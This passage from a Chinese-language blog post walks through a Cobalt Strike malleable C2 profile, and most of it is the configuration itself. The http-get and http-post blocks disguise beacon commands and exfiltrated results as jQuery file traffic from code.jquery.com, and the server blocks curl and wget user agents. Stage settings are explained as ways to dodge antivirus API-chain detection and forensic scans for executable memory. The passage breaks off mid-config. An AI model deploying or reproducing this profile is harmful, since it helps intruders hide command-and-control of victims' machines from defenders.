class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Http-Config"><a href="#Http-Config" class="headerlink" title="Http-Config"></a>Http-Config</h4><p>不单单是http实际上也是https的全局响应头配置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http-config &#123;</span><br><span class="line">    <span class="built_in">set</span> headers <span class="string">&quot;Date, Server, Content-Length, Keep-Alive, Connection, Content-Type&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;Apache&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Keep-Alive&quot;</span> <span class="string">&quot;timeout=10, max=100&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;Keep-Alive&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> trust_x_forwarded_for <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> block_useragents <span class="string">&quot;curl*,lynx*,wget*&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Http-Get"><a href="#Http-Get" class="headerlink" title="Http-Get"></a>Http-Get</h4><p>命令的下发相当于是teamserver(cs服务端)向受害者发送一个get请求 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">http-get &#123;</span><br><span class="line">	<span class="comment"># 下发命令访问的uri</span></span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/jquery-3.3.1.min.js&quot;</span>;</span><br><span class="line">    <span class="comment"># 请求方法</span></span><br><span class="line">    <span class="built_in">set</span> verb <span class="string">&quot;GET&quot;</span>;</span><br><span class="line">    <span class="comment"># 客户端配置</span></span><br><span class="line">    client &#123;</span><br><span class="line">        <span class="comment"># 请求头配置</span></span><br><span class="line">        header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>;</span><br><span class="line">        <span class="comment">#header &quot;Host&quot; &quot;code.jquery.com&quot;;</span></span><br><span class="line">        header <span class="string">&quot;Referer&quot;</span> <span class="string">&quot;http://code.jquery.com/&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Accept-Encoding&quot;</span> <span class="string">&quot;gzip, deflate&quot;</span>;</span><br><span class="line">        <span class="comment"># 元数据</span></span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            prepend <span class="string">&quot;__cfduid=&quot;</span>;</span><br><span class="line">            header <span class="string">&quot;Cookie&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment"># 服务端配置</span></span><br><span class="line">    server &#123;</span><br><span class="line">	    <span class="comment"># 响应头设置</span></span><br><span class="line">        header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;NetDNA-cache/2.2&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;max-age=0, no-cache&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Pragma&quot;</span> <span class="string">&quot;no-cache&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;keep-alive&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/javascript; charset=utf-8&quot;</span>;</span><br><span class="line">        <span class="comment"># 输出信息</span></span><br><span class="line">        output &#123;   </span><br><span class="line">            mask;</span><br><span class="line">            base64url;</span><br><span class="line">            <span class="comment">## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)</span></span><br><span class="line">            <span class="comment"># 2nd Line            </span></span><br><span class="line">            prepend <span class="string">&quot;!function(e,t)&#123;\&quot;use strict\&quot;;\&quot;object\&quot;==typeof module&amp;&amp;\&quot;object\&quot;==typeof module.exports?module.exports=e.document?t(e,!0):function(e)&#123;if(!e.document)throw new Error(\&quot;jQuery requires a window with a document\&quot;);return t(e)&#125;:t(e)&#125;(\&quot;undefined\&quot;!=typeof window?window:this,function(e,t)&#123;\&quot;use strict\&quot;;var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l=&#123;&#125;,c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h=&#123;&#125;,g=function e(t)&#123;return\&quot;function\&quot;==typeof t&amp;&amp;\&quot;number\&quot;!=typeof t.nodeType&#125;,y=function e(t)&#123;return null!=t&amp;&amp;t===t.window&#125;,v=&#123;type:!0,src:!0,noModule:!0&#125;;function m(e,t,n)&#123;var i,o=(t=t||r).createElement(\&quot;script\&quot;);if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)&#125;function x(e)&#123;return null==e?e+\&quot;\&quot;:\&quot;object\&quot;==typeof e||\&quot;function\&quot;==typeof e?l[c.call(e)]||\&quot;object\&quot;:typeof e&#125;var b=\&quot;3.3.1\&quot;,w=function(e,t)&#123;return new w.fn.init(e,t)&#125;,T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype=&#123;jquery:\&quot;3.3.1\&quot;,constructor:w,length:0,toArray:function()&#123;return o.call(this)&#125;,get:function(e)&#123;return null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]&#125;,pushStack:function(e)&#123;var t=w.merge(this.constructor(),e);return t.prevObject=this,t&#125;,each:function(e)&#123;return w.each(this,e)&#125;,map:function(e)&#123;return this.pushStack(w.map(this,function(t,n)&#123;return e.call(t,n,t)&#125;))&#125;,slice:function()&#123;return this.pushStack(o.apply(this,arguments))&#125;,first:function()&#123;return this.eq(0)&#125;,last:function()&#123;return this.eq(-1)&#125;,eq:function(e)&#123;var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])&#125;,end:function()&#123;return this.prevObject||this.constructor()&#125;,push:s,sort:n.sort,splice:n.splice&#125;,w.extend=w.fn.extend=function()&#123;var e,t,n,r,i,o,a=arguments[0]||&#123;&#125;,s=1,u=arguments.length,l=!1;for(\&quot;boolean\&quot;==typeof a&amp;&amp;(l=a,a=arguments[s]||&#123;&#125;,s++),\&quot;object\&quot;==typeof a||g(a)||(a=&#123;&#125;),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:&#123;&#125;,a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a&#125;,w.extend(&#123;expando:\&quot;jQuery\&quot;+(\&quot;3.3.1\&quot;+Math.random()).replace(/\\D/g,\&quot;\&quot;),isReady:!0,error:function(e)&#123;throw new Error(e)&#125;,noop:function()&#123;&#125;,isPlainObject:function(e)&#123;var t,n;return!(!e||\&quot;[object Object]\&quot;!==c.call(e))&amp;&amp;(!(t=i(e))||\&quot;function\&quot;==typeof(n=f.call(t,\&quot;constructor\&quot;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)&#125;,isEmptyObject:function(e)&#123;var t;for(t in e)return!1;return!0&#125;,globalEval:function(e)&#123;m(e)&#125;,each:function(e,t)&#123;var n,r=0;if(C(e))&#123;for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break&#125;else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e&#125;,trim:function(e)&#123;return null==e?\&quot;\&quot;:(e+\&quot;\&quot;).replace(T,\&quot;\&quot;)&#125;,makeArray:function(e,t)&#123;var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\&quot;string\&quot;==typeof e?[e]:e):s.call(n,e)),n&#125;,inArray:function(e,t,n)&#123;return null==t?-1:u.call(t,e,n)&#125;,merge:function(e,t)&#123;for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e&#125;,grep:function(e,t,n)&#123;for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i&#125;,map:function(e,t,n)&#123;var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)&#125;,guid:1,support:h&#125;),\&quot;function\&quot;==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\&quot;Boolean Number String Function Array Date RegExp Object Error Symbol\&quot;.split(\&quot; \&quot;),function(e,t)&#123;l[\&quot;[object \&quot;+t+\&quot;]\&quot;]=t.toLowerCase()&#125;);function C(e)&#123;var t=!!e&amp;&amp;\&quot;length\&quot;in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&quot;array\&quot;===n||0===t||\&quot;number\&quot;==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)&#125;var E=function(e)&#123;var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\&quot;sizzle\&quot;+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t)&#123;return e===t&amp;&amp;(f=!0),0&#125;,N=&#123;&#125;.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t)&#123;for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1&#125;,P=\&quot;\r&quot;</span>;</span><br><span class="line">            <span class="comment"># 1st Line</span></span><br><span class="line">            prepend <span class="string">&quot;/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */&quot;</span>;</span><br><span class="line">            append <span class="string">&quot;\&quot;.(o=t.documentElement,Math.max(t.body[\&quot;scroll\&quot;+e],o[\&quot;scroll\&quot;+e],t.body[\&quot;offset\&quot;+e],o[\&quot;offset\&quot;+e],o[\&quot;client\&quot;+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)&#125;,t,a?i:void 0,a)&#125;&#125;)&#125;),w.each(\&quot;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&quot;.split(\&quot; \&quot;),function(e,t)&#123;w.fn[t]=function(e,n)&#123;return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)&#125;&#125;),w.fn.extend(&#123;hover:function(e,t)&#123;return this.mouseenter(e).mouseleave(t||e)&#125;&#125;),w.fn.extend(&#123;bind:function(e,t,n)&#123;return this.on(e,null,t,n)&#125;,unbind:function(e,t)&#123;return this.off(e,null,t)&#125;,delegate:function(e,t,n,r)&#123;return this.on(t,e,n,r)&#125;,undelegate:function(e,t,n)&#123;return 1===arguments.length?this.off(e,\&quot;**\&quot;):this.off(t,e||\&quot;**\&quot;,n)&#125;&#125;),w.proxy=function(e,t)&#123;var n,r,i;if(\&quot;string\&quot;==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function()&#123;return e.apply(t||this,r.concat(o.call(arguments)))&#125;,i.guid=e.guid=e.guid||w.guid++,i&#125;,w.holdReady=function(e)&#123;e?w.readyWait++:w.ready(!0)&#125;,w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e)&#123;var t=w.type(e);return(\&quot;number\&quot;===t||\&quot;string\&quot;===t)&amp;&amp;!isNaN(e-parseFloat(e))&#125;,\&quot;function\&quot;==typeof define&amp;&amp;define.amd&amp;&amp;define(\&quot;jquery\&quot;,[],function()&#123;return w&#125;);var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t)&#123;return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w&#125;,t||(e.jQuery=e.$=w),w&#125;);&quot;</span>;</span><br><span class="line">            <span class="built_in">print</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Http-Post"><a href="#Http-Post" class="headerlink" title="Http-Post"></a>Http-Post</h4><p>结果的回传相当于受害者向teamserver发送一个post请求</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">http-post &#123;</span><br><span class="line">	<span class="comment"># 请求的地址</span></span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/jquery-3.3.2.min.js&quot;</span>;</span><br><span class="line">    <span class="comment"># 请求的方法</span></span><br><span class="line">    <span class="built_in">set</span> verb <span class="string">&quot;POST&quot;</span>;</span><br><span class="line">    <span class="comment"># 客户端配置</span></span><br><span class="line">    client &#123;</span><br><span class="line">	    <span class="comment"># 请求头</span></span><br><span class="line">        header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>;</span><br><span class="line">        <span class="comment">#header &quot;Host&quot; &quot;code.jquery.com&quot;;</span></span><br><span class="line">        header <span class="string">&quot;Referer&quot;</span> <span class="string">&quot;http://code.jquery.com/&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Accept-Encoding&quot;</span> <span class="string">&quot;gzip, deflate&quot;</span>;</span><br><span class="line">        <span class="comment"># 参数</span></span><br><span class="line">        <span class="built_in">id</span> &#123;</span><br><span class="line">            mask;       </span><br><span class="line">            base64url;</span><br><span class="line">            parameter <span class="string">&quot;__cfduid&quot;</span>;            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 输出信息</span></span><br><span class="line">        output &#123;</span><br><span class="line">            mask;</span><br><span class="line">            base64url;</span><br><span class="line">            <span class="built_in">print</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 服务端配置</span></span><br><span class="line">    server &#123;</span><br><span class="line">    	<span class="comment"># 响应头配置</span></span><br><span class="line">        header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;NetDNA-cache/2.2&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;max-age=0, no-cache&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Pragma&quot;</span> <span class="string">&quot;no-cache&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;keep-alive&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/javascript; charset=utf-8&quot;</span>;</span><br><span class="line">        <span class="comment"># 输出的内容</span></span><br><span class="line">        output &#123;</span><br><span class="line">            mask;</span><br><span class="line">            base64url;</span><br><span class="line">            <span class="comment">## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)</span></span><br><span class="line">            <span class="comment"># 2nd Line            </span></span><br><span class="line">            prepend <span class="string">&quot;!function(e,t)&#123;\&quot;use strict\&quot;;\&quot;object\&quot;==typeof module&amp;&amp;\&quot;object\&quot;==typeof module.exports?module.exports=e.document?t(e,!0):function(e)&#123;if(!e.document)throw new Error(\&quot;jQuery requires a window with a document\&quot;);return t(e)&#125;:t(e)&#125;(\&quot;undefined\&quot;!=typeof window?window:this,function(e,t)&#123;\&quot;use strict\&quot;;var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l=&#123;&#125;,c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h=&#123;&#125;,g=function e(t)&#123;return\&quot;function\&quot;==typeof t&amp;&amp;\&quot;number\&quot;!=typeof t.nodeType&#125;,y=function e(t)&#123;return null!=t&amp;&amp;t===t.window&#125;,v=&#123;type:!0,src:!0,noModule:!0&#125;;function m(e,t,n)&#123;var i,o=(t=t||r).createElement(\&quot;script\&quot;);if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)&#125;function x(e)&#123;return null==e?e+\&quot;\&quot;:\&quot;object\&quot;==typeof e||\&quot;function\&quot;==typeof e?l[c.call(e)]||\&quot;object\&quot;:typeof e&#125;var b=\&quot;3.3.1\&quot;,w=function(e,t)&#123;return new w.fn.init(e,t)&#125;,T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype=&#123;jquery:\&quot;3.3.1\&quot;,constructor:w,length:0,toArray:function()&#123;return o.call(this)&#125;,get:function(e)&#123;return null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]&#125;,pushStack:function(e)&#123;var t=w.merge(this.constructor(),e);return t.prevObject=this,t&#125;,each:function(e)&#123;return w.each(this,e)&#125;,map:function(e)&#123;return this.pushStack(w.map(this,function(t,n)&#123;return e.call(t,n,t)&#125;))&#125;,slice:function()&#123;return this.pushStack(o.apply(this,arguments))&#125;,first:function()&#123;return this.eq(0)&#125;,last:function()&#123;return this.eq(-1)&#125;,eq:function(e)&#123;var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])&#125;,end:function()&#123;return this.prevObject||this.constructor()&#125;,push:s,sort:n.sort,splice:n.splice&#125;,w.extend=w.fn.extend=function()&#123;var e,t,n,r,i,o,a=arguments[0]||&#123;&#125;,s=1,u=arguments.length,l=!1;for(\&quot;boolean\&quot;==typeof a&amp;&amp;(l=a,a=arguments[s]||&#123;&#125;,s++),\&quot;object\&quot;==typeof a||g(a)||(a=&#123;&#125;),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:&#123;&#125;,a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a&#125;,w.extend(&#123;expando:\&quot;jQuery\&quot;+(\&quot;3.3.1\&quot;+Math.random()).replace(/\\D/g,\&quot;\&quot;),isReady:!0,error:function(e)&#123;throw new Error(e)&#125;,noop:function()&#123;&#125;,isPlainObject:function(e)&#123;var t,n;return!(!e||\&quot;[object Object]\&quot;!==c.call(e))&amp;&amp;(!(t=i(e))||\&quot;function\&quot;==typeof(n=f.call(t,\&quot;constructor\&quot;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)&#125;,isEmptyObject:function(e)&#123;var t;for(t in e)return!1;return!0&#125;,globalEval:function(e)&#123;m(e)&#125;,each:function(e,t)&#123;var n,r=0;if(C(e))&#123;for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break&#125;else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e&#125;,trim:function(e)&#123;return null==e?\&quot;\&quot;:(e+\&quot;\&quot;).replace(T,\&quot;\&quot;)&#125;,makeArray:function(e,t)&#123;var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\&quot;string\&quot;==typeof e?[e]:e):s.call(n,e)),n&#125;,inArray:function(e,t,n)&#123;return null==t?-1:u.call(t,e,n)&#125;,merge:function(e,t)&#123;for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e&#125;,grep:function(e,t,n)&#123;for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i&#125;,map:function(e,t,n)&#123;var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)&#125;,guid:1,support:h&#125;),\&quot;function\&quot;==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\&quot;Boolean Number String Function Array Date RegExp Object Error Symbol\&quot;.split(\&quot; \&quot;),function(e,t)&#123;l[\&quot;[object \&quot;+t+\&quot;]\&quot;]=t.toLowerCase()&#125;);function C(e)&#123;var t=!!e&amp;&amp;\&quot;length\&quot;in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&quot;array\&quot;===n||0===t||\&quot;number\&quot;==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)&#125;var E=function(e)&#123;var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\&quot;sizzle\&quot;+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t)&#123;return e===t&amp;&amp;(f=!0),0&#125;,N=&#123;&#125;.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t)&#123;for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1&#125;,P=\&quot;\r&quot;</span>;</span><br><span class="line">            <span class="comment"># 1st Line</span></span><br><span class="line">            prepend <span class="string">&quot;/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */&quot;</span>;</span><br><span class="line">            append <span class="string">&quot;\&quot;.(o=t.documentElement,Math.max(t.body[\&quot;scroll\&quot;+e],o[\&quot;scroll\&quot;+e],t.body[\&quot;offset\&quot;+e],o[\&quot;offset\&quot;+e],o[\&quot;client\&quot;+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)&#125;,t,a?i:void 0,a)&#125;&#125;)&#125;),w.each(\&quot;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&quot;.split(\&quot; \&quot;),function(e,t)&#123;w.fn[t]=function(e,n)&#123;return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)&#125;&#125;),w.fn.extend(&#123;hover:function(e,t)&#123;return this.mouseenter(e).mouseleave(t||e)&#125;&#125;),w.fn.extend(&#123;bind:function(e,t,n)&#123;return this.on(e,null,t,n)&#125;,unbind:function(e,t)&#123;return this.off(e,null,t)&#125;,delegate:function(e,t,n,r)&#123;return this.on(t,e,n,r)&#125;,undelegate:function(e,t,n)&#123;return 1===arguments.length?this.off(e,\&quot;**\&quot;):this.off(t,e||\&quot;**\&quot;,n)&#125;&#125;),w.proxy=function(e,t)&#123;var n,r,i;if(\&quot;string\&quot;==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function()&#123;return e.apply(t||this,r.concat(o.call(arguments)))&#125;,i.guid=e.guid=e.guid||w.guid++,i&#125;,w.holdReady=function(e)&#123;e?w.readyWait++:w.ready(!0)&#125;,w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e)&#123;var t=w.type(e);return(\&quot;number\&quot;===t||\&quot;string\&quot;===t)&amp;&amp;!isNaN(e-parseFloat(e))&#125;,\&quot;function\&quot;==typeof define&amp;&amp;define.amd&amp;&amp;define(\&quot;jquery\&quot;,[],function()&#123;return w&#125;);var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t)&#123;return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w&#125;,t||(e.jQuery=e.$=w),w&#125;);&quot;</span>;</span><br><span class="line">            <span class="built_in">print</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Stage"><a href="#Stage" class="headerlink" title="Stage"></a>Stage</h4><div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409261117454.png" data-fancybox="true"/></div></div>
+
+<p>CS会把<code>shellcode</code>写入到内存中去,并且创建线程执行这个<code>shellcode</code>,而这个<code>shellcode</code>又会申请一块新的内存,不会在原来的内存中进行操作.然后通过网络从<code>TeamServer</code>服务器上下载一个真正的<code>Beacon</code>,这个<code>Beacon</code>是被加密的.<strong>图例中”被加密的Payload”</strong>,这部分内容就会被写入到第二块内存中去,同时这部分内存还保存有一个可以被识别的解密程序,然后根据这个解密程序它会进行自解密变成两部分,一部分是反射DLL,另一部分是这个反射DLL的<code>Loader</code>.接着这个反射DLL又会申请一块新内存,并复制<code>Beacon</code>到新内存中去.最后我们想要执行命令的那些操作功能都将在第三块内存中进行.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">stage &#123;</span><br><span class="line">    <span class="comment"># CS 4.2 added allocator and MZ header overrides</span></span><br><span class="line">    <span class="built_in">set</span> allocator      <span class="string">&quot;VirtualAlloc&quot;</span>; <span class="comment"># 有三个内存分配函数,分别为:HeapAlloc、MapViewOfFile、VirtualAlloc. 杀毒会检测API的调用链，所以要对内存分配的函数进行自定义</span></span><br><span class="line">    <span class="comment">#set magic_mz_x86   &quot;MZRE&quot;; # 相当于花指令</span></span><br><span class="line">    <span class="comment">#set magic_mz_x64   &quot;MZAR&quot;; # 相当于花指令</span></span><br><span class="line">    <span class="built_in">set</span> magic_pe       <span class="string">&quot;NO&quot;</span>; <span class="comment"># 不覆盖Beacon的反射加载器使用的PE文件</span></span><br><span class="line">    <span class="built_in">set</span> userwx         <span class="string">&quot;false&quot;</span>;  <span class="comment"># 内存分配:正常的内存分配基本上不会出现可读、可写、可执行的情况，所以在溯源取证时就会去找存在可读、可写、可执行的内存块，当设置为 false 时内存状态就不可读、不可写、不可执行</span></span><br><span class="line">    <span class="built_in">set</span> stomppe        <span class="string">&quot;true&quot;</span>; 